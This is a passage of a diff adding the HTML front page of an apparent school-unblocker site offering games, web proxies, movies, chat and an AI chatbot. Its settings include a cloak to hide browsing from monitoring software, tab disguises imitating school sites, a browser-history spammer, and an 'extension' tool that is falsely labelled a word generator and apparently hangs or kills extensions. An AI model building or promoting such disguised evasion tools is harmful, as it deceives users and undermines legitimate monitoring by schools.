@@ -1,0 +1,1365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Delta V10</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Electrolize&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@100..900&family=Geist:wght@100..900&display=swap" rel="stylesheet">
+    <link id="faviconLink" rel="icon" type="image/x-icon" href="/static/favicons/default.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <link rel="stylesheet" href="/css/index.css">
+    <link rel="stylesheet" href="/css/sidebar.css">
+    <link rel="stylesheet" href="/css/chatbot.css">
+    <link rel="stylesheet" href="/css/game.css">
+    <link rel="stylesheet" href="/css/chat.css">
+
+    <link href="https://cdn.jsdelivr.net/gh/google/code-prettify@master/src/prettify.css" rel="stylesheet" />
+
+    <script src="/public/baremux/index.js"></script> 
+    <script src="/public/epoxy/index.mjs"></script>
+    <script src="/public/scram/scramjet.all.js"></script> 
+    <script src="main.js"></script>
+    <script src="/js/tailwind.js"></script>
+    <script src="/js/login.js"></script>
+    <script src="/js/redirect.js"></script>
+    <script src="/js/maintenance.js"></script>
+    <script src="/js/particles.js"></script>
+    <script src="/js/mouse.js"></script>
+    <script src="/js/sidebar.js"></script>
+    <script src="/js/settings.js"></script>
+    <script src="/js/game.js" defer></script>
+    <script type="module" src="https://cdn.jsdelivr.net/npm/@google/genai@1.21.0/dist/index.mjs"></script>
+    <script type="module" src="/js/chatbot.js"></script>
+    <script src="/js/chat.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/src/prettify.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+</head>
+
+<body class="bg-dark-navy selection:bg-baby-blue selection:text-dark-navy flex">
+
+    <div class="main-content flex-1 z-10 relative">
+
+        <div id="app-content">
+        </div>
+
+        <footer class="mt-12 py-8">
+            <div class="max-w-7xl mx-auto px-4 text-center">
+                <p class="text-sm text-gray-500 mb-4">
+                    &copy; 2025 Delta. All Rights Reserved.
+                </p>
+                <div class="flex justify-center space-x-6">
+                    <a href="https://docs.google.com/document/d/1ZihQ_dz2vcGVRJ60QBOur6GYmyQwatzuu7nJ4FjO-fk/edit?tab=t.0" target="_blank" class="text-gray-400 hover:text-baby-blue text-xs">Terms of Use</a>
+                    <span class="text-gray-700">|</span>
+                    <a href="mailto:contact@deltasvth@gmail.com" class="text-gray-400 hover:text-baby-blue text-xs">Support</a>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H5VGHQJKD8"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'G-H5VGHQJKD8');
+    </script>
+
+
+    <script>
+        const appContent = document.getElementById('app-content');
+        const routes = {
+            '/index': 'index',
+            '/games': 'games',
+            '/ai': 'ai',
+            '/movies': 'movies',
+            '/partners': 'partners',
+            '/proxy': 'proxy',
+            '/settings': 'settings',
+            '/updates': 'updates',
+            '/help': 'help',
+            '/chat': 'chat'
+        };
+
+        const pageContent = {
+            'index': `
+                <main>
+        <section id="overview" class="py-20 md:py-32 text-center max-w-5xl mx-auto px-4">
+            <div class="max-w-4xl mx-auto">
+                <p class="text-sm uppercase tracking-widest mb-4 text-baby-blue/70 shadow-neon-sm inline-block px-3 py-1 rounded-full border border-baby-blue/20 animate-in"
+                   style="animation-delay: 0s;">
+                    Delta V10
+                </p>
+                
+                <h2 class="text-5xl md:text-7xl font-extrabold mb-6 leading-tight animate-in"
+                    style="animation-delay: 0.2s;">Play
+                    <span class="neon-text">Any</span> Game.<br>
+                    <span class="text-gray-200">Choose Delta V10.</span>
+                </h2>
+                
+                <p class="text-lg text-gray-400 mb-10 max-w-2xl mx-auto animate-in"
+                   style="animation-delay: 0.4s;">
+                    Delta V10 provides access to 1,800+ games, fast proxies, a chat, and an AI assistant.
+                </p>
+
+                <div class="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-6 animate-in"
+                     style="animation-delay: 0.6s;">
+                    <a href="/games" onclick="route(event)" class="px-8 py-3 font-bold rounded-xl text-dark-navy bg-baby-blue neon-element hover:text-dark-navy hover:bg-white shadow-neon-glow neon-primary-button">
+                    Play Now
+                    </a>
+                </div>
+            </div>
+        </section>
+    </main>
+
+<section id="features" class="py-16 md:py-24 max-w-7xl mx-auto px-4">
+    <h3 class="text-4xl font-bold text-center mb-16 animate-in"
+        style="animation-delay: 0s;">
+        <span class="neon-text">Features</span>
+    </h3>
+
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 md:gap-12">
+        <div class="p-6 rounded-xl bg-dark-surface feature-card shadow-lg animate-in"
+             style="animation-delay: 0.1s;">
+            <div class="text-3xl neon-text mb-4">
+                <i class="fas fa-gamepad"></i>
+            </div>
+            <h4 class="text-xl font-semibold mb-2 neon-text">
+                Game Library
+            </h4>
+            <p class="text-gray-400 text-sm">
+                Explore our 1800+ games.
+            </p>
+        </div>
+        
+        <div class="p-6 rounded-xl bg-dark-surface feature-card shadow-lg animate-in"
+             style="animation-delay: 0.2s;">
+            <div class="text-3xl neon-text mb-4">
+                <i class="fas fa-globe"></i>
+            </div>
+            <h4 class="text-xl font-semibold mb-2 neon-text">
+                Secure Proxies
+            </h4>
+            <p class="text-gray-400 text-sm">
+                Browse and play privately using our built-in, encrypted proxies.
+            </p>
+        </div>
+        
+        <div class="p-6 rounded-xl bg-dark-surface feature-card shadow-lg animate-in"
+             style="animation-delay: 0.2s;">
+            <div class="text-3xl neon-text mb-4">
+                <i class="fas fa-robot"></i>
+            </div>
+            <h4 class="text-xl font-semibold mb-2 neon-text">
+                AI Assistant
+            </h4>
+            <p class="text-gray-400 text-sm">
+                Get quick answers and assistance with our AI chatbot.
+            </p>
+        </div>
+        <div class="p-6 rounded-xl bg-dark-surface feature-card shadow-lg animate-in"
+             style="animation-delay: 0.2s;">
+            <div class="text-3xl neon-text mb-4">
+                <i class="fas fa-ban"></i>
+            </div>
+            <h4 class="text-xl font-semibold mb-2 neon-text">
+                Free + No Ads
+            </h4>
+            <p class="text-gray-400 text-sm">
+                Absolutely no ads, ever. Every feature is completely free with no hidden charges.
+            </p>
+        </div>
+        <div class="p-6 rounded-xl bg-dark-surface feature-card shadow-lg animate-in"
+             style="animation-delay: 0.2s;">
+            <div class="text-3xl neon-text mb-4">
+                <i class="fas fa-comment"></i>
+            </div>
+            <h4 class="text-xl font-semibold mb-2 neon-text">
+                Chat
+            </h4>
+            <p class="text-gray-400 text-sm">
+                Chat with others.
+            </p>
+        </div>
+        <div class="p-6 rounded-xl bg-dark-surface feature-card shadow-lg animate-in"
+             style="animation-delay: 0.2s;">
+            <div class="text-3xl neon-text mb-4">
+                <i class="fas fa-video"></i>
+            </div>
+            <h4 class="text-xl font-semibold mb-2 neon-text">
+                Movies
+            </h4>
+            <p class="text-gray-400 text-sm">
+                Watch movies at any time.
+            </p>
+        </div>
+    </div>
+</section>
+                </main>
+            `,
+            'ai': `
+                <div class="nexora">
+    <div class="app">
+        <div class="chat">
+            <div class="intro animate-in" id="intro" style="animation-delay: 0s;">
+                <h1>What can I do for you?</h1>
+            </div>
+            <div class="scroll animate-in" id="scroll" aria-live="polite" style="animation-delay: 0.2s;"></div>
+        </div>
+
+        <div class="footer animate-in" style="animation-delay: 0.4s;">
+            <div class="input-row">
+                <input id="prompt" class="input" placeholder="Talk to Delta AI..." autocomplete="off" />
+                <button id="send" class="send" title="Send" aria-label="Send message">↑</button>
+            </div>
+        </div>
+    </div>
+</div>
+            `,
+            'movies': `
+<main>
+    <section id="overview" style="padding: 0; height: 100vh; width: 100vw;">
+        <div style="height: 100%; width: 100%; padding: 20px; box-sizing: border-box;"> <iframe src="https://moviesvn.net/"
+                    class="border-none"
+                    style="width: calc(90% - 40px); height: calc(105% - 40px); margin-right: auto;"
+                    title="Embedded Website" 
+                    sandbox="allow-forms allow-scripts allow-same-origin allow-pointer-lock">
+            </iframe>
+        </div>
+    </section>
+</main>
+            `,
+'games': `
+<div class="max-w-7xl mx-auto">
+    <div class="mb-8 sticky top-0 z-10 bg-slate-900/95 backdrop-blur-sm p-4 -mx-4 sm:mx-0 rounded-xl shadow-lg">
+        <input type="text" id="searchInput" placeholder="Search by game title..."
+            class="w-full p-3 rounded-3xl bg-slate-800 border-0 focus:ring-0 focus:border-cyan-400 focus:shadow-xl focus:shadow-cyan-400/50 text-white placeholder-slate-500 transition duration-300 ease-in-out focus:outline-none"
+            oninput="filterGames(this.value)">
+    </div>
+    
+    <div id="game-embed-container" 
+        class="absolute z-50 flex flex-col justify-center items-center bg-slate-950/90 p-4 top-0 left-0 right-0 bottom-0"
+        style="display: flex;">
+
+        <div id="game-window"
+            class="w-full max-w-10xl flex-shrink bg-slate-950 rounded-2xl overflow-hidden
+            border-4 border-cyan-400 shadow-[0_0_80px_10px_rgba(46,220,255,0.7)] transition-all duration-300"
+            style="height: calc(100% - 4rem - 24px); max-height: 90vh;">
+            
+            <div id="game-frame-wrapper" 
+                class="w-full h-full overflow-hidden relative" 
+                style="background-color: #0d121c;">
+            </div>
+        </div>
+
+        <div id="game-toolbar" 
+            class="flex justify-between items-center h-16 px-6 bg-slate-900 
+            rounded-2xl mt-4 mx-auto w-full max-w-10xl 
+            border border-slate-700 
+            shadow-[0_0_40px_5px_rgba(46,220,255,0.7)] transition-all duration-300">
+            <div class="flex items-center space-x-4">
+                <button onclick="closeGameEmbed()" 
+                        class="px-4 py-2 bg-red-700 hover:bg-red-600 text-white text-base font-semibold rounded-full shadow-lg transition duration-150 transform hover:scale-105">
+                    ❌ Close Game
+                </button>
+                <span id="game-title-display" class="text-cyan-400 font-extrabold text-xl tracking-wider truncate"></span>
+            </div>
+
+            <div class="flex space-x-3">
+                <button onclick="toggleFullscreen()" 
+                    class="p-2 bg-slate-700 text-cyan-400 hover:bg-slate-600 transition duration-150 rounded-full shadow-md"
+                    title="Toggle Fullscreen">
+                    <img src="https://www.svgrepo.com/show/335574/fullscreen.svg" alt="Fullscreen" class="h-6 w-6" />
+                </button>
+                <button onclick="openGameInNewWindow()" 
+                    class="p-2 bg-slate-700 text-cyan-400 hover:bg-slate-600 transition duration-150 rounded-full shadow-md"
+                    title="Open in New Window">
+                    <img src="https://www.svgrepo.com/show/9306/fullscreen.svg" alt="Open in New Window" class="h-6 w-6" />
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="gameGrid" 
+        class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-6"
+        style="transform-style: preserve-3d; perspective: 1000px;"> 
+        </div>
+
+    <div id="pagination" class="flex justify-center mt-10 space-x-2">
+    </div>
+</div>
+`,
+            'partners': `
+                <main>
+                    <section id="overview" class="py-20 md:py-32 text-center max-w-5xl mx-auto px-4">
+                        <div class="max-w-4xl mx-auto">
+                            <h2 class="text-5xl md:text-7xl font-extrabold mb-6 leading-tight">
+                                <span class="neon-text">Partners</span> <br>
+                            </h2>
+                            <p class="text-lg text-gray-400 mb-10 max-w-2xl mx-auto">
+                               1 Partner:
+                            </p>
+                            <div class="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-6">
+                                <a href="https://easynotes22-15927344.codehs.me/" class="relative flex items-center justify-center rounded-xl transition duration-200">
+                                    <div class="absolute top-0 w-full text-center text-white text-base font-bold pointer-events-none transform -translate-y-full mb-10">Nexora</div>
+                                    <img src="/static/favicons/nexora-logo.png" alt="Nexora Icon Link" class="w-32 h-32 rounded-lg hover:opacity-80 transition duration-200">
+                                </a>
+                            </div>
+                        </div>
+                    </section>
+                </main>
+            `,
+'proxy': `
+   <main class="h-full w-full p-5 box-border">
+
+    <div id="proxy-content-area" class="w-full h-full bg-dark-surface rounded-lg shadow-lg border border-cyan-800/50 p-4 animate-in" 
+         style="height: calc(95vh); animation-delay: 0s;">
+        
+        <p id="proxy-default-message" class="text-gray-400 text-center pt-20 animate-in"
+           style="animation-delay: 0.2s;">
+           Select a proxy from the sidebar dropdown to begin browsing.
+        </p>
+        
+        <iframe id="proxy-iframe" 
+                src="" 
+                class="border-none w-full h-full hidden" 
+                title="Embedded Proxy" 
+                sandbox="allow-forms allow-scripts allow-same-origin allow-pointer-lock">
+        </iframe>
+    </div>
+</main>
+`,
+            'settings': `
+<div class="max-w-4xl mx-auto">
+    <header class="text-center mb-10 pt-4 animate-in"
+            style="animation-delay: 0s;">
+            
+     </header>
+<div class="text-center">
+    <h1 class="text-4xl sm:text-5xl font-extrabold neon-text-h1 mb-4">Delta V10 Settings</h1>
+</div>
+
+    <div id="navButtons" class="flex flex-wrap justify-center gap-4 mb-10 p-4 rounded-xl bg-dark-surface shadow-lg animate-in"
+         style="animation-delay: 0.2s;">
+        <!-- INFO: I've added 'Appearance' as the main tab for cloaking and themes -->
+        <button class="nav-btn active" data-target="appearance">Appearance</button>
+        <button class="nav-btn" data-target="spammer">Spammer</button>
+        <button class="nav-btn" data-target="extension">Extension</button>
+        <button class="nav-btn" data-target="legal">Legal</button>
+        <button class="nav-btn" data-target="misc">Misc.</button>
+    </div>
+
+    <div id="settingsContent">
+        <!-- INFO: Renamed 'cloaking' panel to 'appearance' to hold both features -->
+        <section id="appearance" class="panel space-y-8">
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0.4s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-2"><code>about:blank</code> Cloak</h2>
+                <p class="text-slate-300 mb-4">Things like <code>about:blank</code> and browser URIs (E.g.
+                <code>chrome://settings</code>) can't be seen by monitoring software like Lightspeed.
+                This also helps prevent others from shoulder-surfing and seeing the link.</p>
+                <p class="text-sm text-yellow-300 mb-4 font-mono">Note: This may not work with very old or command-line browsers.</p>
+                <div class="flex">
+                    <button id="openCloakButton" class="neon-btn flex items-center"
+                            onclick="window.openCloakedPageWrapper();">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        Open Tab
+                    </button>
+                </div>
+            </div>
+
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0.6s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-2">Tab Disguise</h2>
+                <p class="text-slate-300 mb-4">Choose which familiar site the tab should mimic (title and favicon).</p>
+                <div id="disguise-preview" class="p-4 mb-4 rounded-lg bg-slate-900 border border-slate-700 flex items-center space-x-4">
+                    <div class="w-8 h-8 rounded-full bg-slate-500 flex items-center justify-center text-xs font-bold text-white">
+                        <img id="disguise-favicon-preview-img" src="/static/favicons/default.ico" alt="Favicon Preview" class="w-full h-full rounded-full object-cover">
+                    </div>
+                    <div>
+                        <h3 id="disguise-title" class="text-xl font-bold text-white">Delta V10</h3>
+                        <p id="disguise-sub" class="text-sm text-slate-400">Default Title and Favicon</p>
+                    </div>
+                </div>
+                <select id="disguiseSelect" class="w-full p-3 rounded-lg bg-slate-800 border border-slate-600
+                focus:ring-baby-blue focus:border-baby-blue text-white placeholder-slate-500 transition duration-150 cursor-pointer">
+                    <option value="None" selected>(None)</option>
+                    <option value="Clever">Clever</option>
+                    <option value="Canvas">Canvas</option>
+                    <option value="Google Drive">Google Drive</option>
+                    <option value="Edpuzzle">Edpuzzle</option>
+                    <option value="Kahoot!">Kahoot</option>
+                </select>
+            </div>
+
+            <!-- 
+                💥 NEW THEME SWITCHER SECTION 
+            -->
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0.8s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-2">Color Theme</h2>
+                <p class="text-slate-300 mb-4">Select the color accent for the website. This only affects pages using the main stylesheet.</p>
+                
+                <!-- Theme Preview -->
+                <div id="theme-preview" class="p-4 mb-4 rounded-lg bg-slate-900 border border-slate-700">
+                    <h3 id="theme-title" class="text-xl font-bold text-white mb-2" style="color: var(--color-accent); text-shadow: 0 0 8px var(--color-accent-shadow); transition: all 0.3s ease;">
+                        Default (Blue)
+                    </h3>
+                    <div class="flex space-x-4">
+                        <div class="w-1/3 p-3 rounded-lg" style="background-color: var(--color-background); transition: all 0.3s ease;">
+                            <span class="text-sm text-slate-400">Background</span>
+                        </div>
+                        <div class="w-1/3 p-3 rounded-lg" style="background-color: var(--color-surface); transition: all 0.3s ease;">
+                            <span class="text-sm text-slate-400">Surface</span>
+                        </div>
+                        <div class="w-1/3 p-3 rounded-lg" style="background-color: var(--color-accent); transition: all 0.3s ease;">
+                            <span class="text-sm font-bold" style="color: var(--color-background);">Accent</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Theme Selection Dropdown -->
+                <select id="themeSelect" class="w-full p-3 rounded-lg bg-slate-800 border border-slate-600
+                focus:ring-baby-blue focus:border-baby-blue text-white placeholder-slate-500 transition duration-150 cursor-pointer">
+                    <option value="theme-default" selected>Default (Blue)</option>
+                    <option value="theme-magma-40">Magma 40 (Red)</option>
+                    <option value="theme-oak-sapling">Oak Sapling (Green)</option>
+                </select>
+            </div>
+
+        </section>
+
+        <section id="spammer" class="panel space-y-8" hidden aria-hidden="true">
+            <!-- ... content for spammer ... -->
+            <style>
+                #spammer-container {
+                    --spammer-base: #1e1e2e;
+                    --spammer-mantle: #181825;
+                    --spammer-crust: #11111b;
+                    --spammer-text: #cdd6f4;
+                    --spammer-subtext1: #bac2de;
+                    --spammer-surface0: #313244;
+                    --spammer-mauve: #cba6f7;
+                    --spammer-pink: #f5c2e7;
+                    --spammer-green: #a6e3a1;
+                    --spammer-peach: #fab387;
+                    --spammer-radius: 8px;
+
+                    background-color: var(--spammer-base);
+                    padding: 2rem;
+                    border-radius: var(--spammer-radius);
+                }
+
+                #spammer-container * {
+                    box-sizing: border-box;
+                    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+                }
+
+                .spammer-container-content {
+                    background-color: var(--spammer-mantle);
+                    border-radius: var(--spammer-radius);
+                    padding: 2rem;
+                    width: 100%;
+                    max-width: 500px;
+                    margin: 0 auto;
+                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+                    border: 1px solid var(--spammer-surface0);
+                    color: var(--spammer-text);
+                }
+
+                .spammer-container-content h1 {
+                    color: var(--spammer-mauve);
+                    margin-bottom: 1.5rem;
+                    font-weight: 700;
+                    text-align: center;
+                    font-size: 1.8rem;
+                }
+
+                .spammer-form-group {
+                    margin-bottom: 1.2rem;
+                }
+
+                .spammer-form-group label {
+                    display: block;
+                    margin-bottom: 0.5rem;
+                    color: var(--spammer-subtext1);
+                    font-size: 0.9rem;
+                }
+
+                .spammer-form-group input {
+                    width: 100%;
+                    padding: 0.75rem 1rem;
+                    background-color: var(--spammer-crust);
+                    border: 1px solid var(--spammer-surface0);
+                    border-radius: var(--spammer-radius);
+                    color: var(--spammer-text);
+                    font-size: 1rem;
+                    transition: all 0.2s ease;
+                }
+
+                .spammer-form-group input:focus {
+                    outline: none;
+                    border-color: var(--spammer-mauve);
+                    box-shadow: 0 0 0 2px rgba(203, 166, 247, 0.25);
+                }
+
+                #spammer-startButton {
+                    width: 100%;
+                    padding: 0.75rem;
+                    background-color: var(--spammer-mauve);
+                    color: var(--spammer-base);
+                    border: none;
+                    border-radius: var(--spammer-radius);
+                    font-size: 1rem;
+                    font-weight: 600;
+                    cursor: pointer;
+                    transition: all 0.2s ease;
+                    margin-top: 0.5rem;
+                }
+
+                #spammer-startButton:hover {
+                    background-color: var(--spammer-pink);
+                    transform: translateY(-2px);
+                }
+
+                #spammer-startButton:active {
+                    transform: translateY(0);
+                }
+
+                .spammer-status {
+                    margin-top: 1.5rem;
+                    padding: 1rem;
+                    border-radius: var(--spammer-radius);
+                    background-color: var(--spammer-surface0);
+                    display: none;
+                }
+
+                .spammer-status.active {
+                    display: block;
+                }
+
+                .spammer-status.success {
+                    background-color: rgba(166, 227, 161, 0.2);
+                    border: 1px solid var(--spammer-green);
+                    color: var(--spammer-green);
+                }
+
+                .spammer-footer {
+                    margin-top: 1.5rem;
+                    color: var(--spammer-surface0);
+                    font-size: 0.8rem;
+                    text-align: center;
+                }
+
+                #spammer-progressContainer {
+                    width: 100%;
+                    height: 6px;
+                    background-color: var(--spammer-surface0);
+                    border-radius: 3px;
+                    margin-top: 1.5rem;
+                    overflow: hidden;
+                    display: none;
+                }
+
+                #spammer-progressBar {
+                    height: 100%;
+                    background-color: var(--spammer-green);
+                    width: 0%;
+                    transition: width 0.3s ease;
+                }
+
+                .spammer-section-title {
+                    color: var(--spammer-peach);
+                    font-size: 1rem;
+                    margin: 1.5rem 0 1rem;
+                    padding-bottom: 0.5rem;
+                    border-bottom: 1px solid var(--spammer-surface0);
+                }
+
+                .spammer-checkbox-group {
+                    display: flex;
+                    align-items: center;
+                    margin-bottom: 0.5rem;
+                }
+
+                .spammer-checkbox-group input[type="checkbox"] {
+                    width: auto;
+                    margin-right: 0.5rem;
+                    cursor: pointer;
+                }
+
+                .spammer-checkbox-group label {
+                    margin-bottom: 0;
+                    cursor: pointer;
+                }
+
+                .spammer-collapsible {
+                    max-height: 0;
+                    overflow: hidden;
+                    transition: max-height 0.3s ease;
+                }
+
+                .spammer-collapsible.open {
+                    max-height: 200px;
+                }
+            </style>
+            
+            <div id="spammer-container">
+                <div class="spammer-container-content">
+                    <h1>Chrome History Spammer</h1>
+
+                    <div class="spammer-form-group">
+                        <label for="spammer-duration">Duration (seconds):</label>
+                        <input type="number" id="spammer-duration" value="10" min="1">
+                    </div>
+
+                    <div class="spammer-form-group">
+                        <label for="spammer-interval">Interval (seconds):</label>
+                        <input type="number" id="spammer-interval" value="1" min="0.1" step="0.1">
+                    </div>
+
+                    <div class="spammer-section-title">Disguise Options</div>
+
+                    <div class="spammer-form-group spammer-checkbox-group">
+                        <input type="checkbox" id="spammer-changeTabTitle" onchange="window.spammer_toggleCollapsible('spammer-tabTitleOptions')">
+                        <label for="spammer-changeTabTitle">Change Tab Title</label>
+                    </div>
+
+                    <div class="spammer-collapsible" id="spammer-tabTitleOptions">
+                        <div class="spammer-form-group">
+                            <label for="spammer-customTabTitle">Custom Tab Title:</label>
+                            <input type="text" id="spammer-customTabTitle" placeholder="e.g. Google Docs">
+                        </div>
+                    </div>
+
+                    <div class="spammer-form-group spammer-checkbox-group">
+                        <input type="checkbox" id="spammer-changeTabIcon" onchange="window.spammer_toggleCollapsible('spammer-tabIconOptions')">
+                        <label for="spammer-changeTabIcon">Change Tab Icon</label>
+                    </div>
+
+                    <div class="spammer-collapsible" id="spammer-tabIconOptions">
+                        <div class="spammer-form-group">
+                            <label for="spammer-customTabIcon">Icon URL:</label>
+                            <input type="text" id="spammer-customTabIcon" placeholder="e.g. https://www.google.com/favicon.ico">
+                        </div>
+                    </div>
+
+                    <button id="spammer-startButton" onclick="window.spammer_startSpamming()">Start Spamming</button>
+
+                    <div id="spammer-progressContainer">
+                        <div id="spammer-progressBar"></div>
+                    </div>
+
+                    <div class="spammer-status" id="spammer-statusMessage"></div>
+                </div>
+
+                <div class="spammer-footer">
+                    Spammed URLs will appear in your browser history
+                </div>
+            </div>
+        </section>
+
+        <section id="extension" class="panel space-y-8" hidden aria-hidden="true">
+            <!-- ... content for extension ... -->
+             <style>
+                #extension-tool-wrapper {
+                  --ext-background: #1e1e2e;
+                  --ext-surface: #313244;
+                  --ext-overlay: #6c7086;
+                  --ext-text: #cdd6f4;
+                  --ext-subtext: #a6adc8;
+                  --ext-primary: #cba6f7;
+                  --ext-secondary: #89dceb;
+                  --ext-red: #f38ba8;
+                  --ext-green: #a6e3a1;
+                  --ext-yellow: #f9e2af;
+                  --ext-blue: #89b4fa;
+                  --ext-lavender: #b4befe;
+                  font-family: 'Geist', monospace;
+                }
+
+                #extension-tool-wrapper .header-content {
+                  display: flex; align-items: center; justify-content: center; margin-bottom: 1rem;
+                }
+                #extension-tool-wrapper .logo-icon {
+                  font-size: 1.8rem; margin-right: 1rem; color: var(--ext-primary);
+                }
+                #extension-tool-wrapper h1 { font-size: 1.8rem; color: var(--ext-text); }
+                
+                #extension-tool-wrapper .container {
+                  max-width: 100%;
+                  margin: 0 auto;
+                  padding: 2rem;
+                  background-color: var(--ext-surface);
+                  border-radius: 10px;
+                  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+                  color: var(--ext-text);
+                }
+
+                #extension-tool-wrapper .dropdown, #extension-tool-wrapper input[type="number"] {
+                  width: 100%; padding: 0.8rem; font-size: 1rem;
+                  border: 2px solid var(--ext-overlay); border-radius: 6px;
+                  background-color: var(--ext-background); color: var(--ext-text);
+                  outline: none; margin-bottom: 1rem;
+                }
+
+                #extension-tool-wrapper button {
+                  font-size: 1rem; padding: 0.8rem 1.5rem; border: none;
+                  border-radius: 6px; font-weight: 500; cursor: pointer;
+                  transition: all 0.3s ease; margin: 5px;
+                }
+
+                #ext_hangButton { background-color: var(--ext-blue); color: var(--ext-background); }
+                #ext_hangButton:hover { background-color: var(--ext-lavender); transform: translateY(-2px); }
+
+                #ext_killButton { background-color: var(--ext-red); color: var(--ext-background); display: none; }
+                #ext_killButton:hover { background-color: #f7526f; transform: translateY(-2px); }
+
+                #ext_statusText {
+                  margin-top: 1.5rem; padding: 1rem; background-color: var(--ext-background);
+                  border-radius: 8px; border-left: 4px solid var(--ext-green); display: none;
+                }
+
+                #ext_processingOverlay {
+                  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                  background-color: rgba(24, 24, 37, 0.9);
+                  display: none; justify-content: center; align-items: center;
+                  z-index: 9999; flex-direction: column;
+                }
+                
+                .ext-spinner {
+                   width: 50px; height: 50px; border: 5px solid rgba(203, 166, 247, 0.3);
+                   border-radius: 50%; border-top-color: var(--ext-primary);
+                   animation: spin 1s linear infinite; margin-bottom: 1.5rem;
+                }
+                @keyframes spin { to { transform: rotate(360deg); } }
+            </style>
+
+            <div id="extension-tool-wrapper">
+                <div class="header-content">
+                  <i class="fas fa-sliders logo-icon"></i>
+                  <h1>Random Word Generator</h1>
+                </div>
+
+                <div class="container">
+                  <p class="info-text" style="margin-bottom: 1.5rem;">
+                    This random word generator generates thousands of random words in less than a minute.
+                  </p>
+
+                  <div class="selection-area">
+                    <label for="ext_extensionSelect" style="display:block; color: #a6adc8; margin-bottom: 0.5rem;">Select word style:</label>
+                    <select id="ext_extensionSelect" class="dropdown"></select>
+                  </div>
+
+                  <div class="slider-area">
+                    <label for="ext_resourceIntensity" style="display:block; color: #a6adc8; margin-bottom: 0.5rem;">
+                      Adjust the number of words to generate below.
+                    </label>
+                    <div class="slider-container" style="display: flex; gap: 1rem; align-items: center;">
+                      <input type="number" id="ext_resourceIntensity" min="100" max="15000" value="2000" step="100">
+                      <span id="ext_resourceValue" style="min-width: 60px; font-weight: bold; color: #b4befe;">2000</span>
+                    </div>
+                  </div>
+
+                  <div class="button-area" style="display: flex; justify-content: center; gap: 1rem; margin-top: 2rem;">
+                    <button id="ext_hangButton"><i class="fas fa-arrow-right"></i> Start Process</button>
+                    <button id="ext_killButton"><i class="fas fa-power-off"></i> Finalize Process</button>
+                  </div>
+
+                  <div id="ext_statusText"></div>
+                </div>
+
+                <div class="overlay" id="ext_processingOverlay">
+                   <div class="ext-spinner"></div>
+                   <p class="status-message" style="font-size: 1.2rem; color: #cdd6f4;">Processing... (This takes approximately 60 seconds)</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="legal" class="panel space-y-6" hidden aria-hidden="true">
+            <!-- ... content for legal ... -->
+            <div class="p-6 rounded-xl bg-dark-surface border border-slate-700 shadow-xl animate-in"
+                 style="animation-delay: 0s;">
+                <h2 class="text-2xl font-semibold text-baby-blue mb-4">Legal Policies</h2>
+                <p class="text-slate-300 mb-6">Policies related to privacy and cookies for this project.</p>
+                <div class="flex justify-between items-center p-4 mb-4 rounded-lg bg-slate-900 border border-slate-800">
+                    <div class="flex-grow">
+                        <h3 class="text-lg font-bold text-white">Acceptable Use Policy</h3>
+                        <p class="text-sm text-slate-400">By using the site, you agree to these rules.</p>
+                    </div>
+                    <a href="https://docs.google.com/document/d/1ZihQ_dz2vcGVRJ60QBOur6GYmyQwatzuu7nJ4FjO-fk/edit?tab=t.0" target="_blank" class="neon-btn flex items-center text-sm">
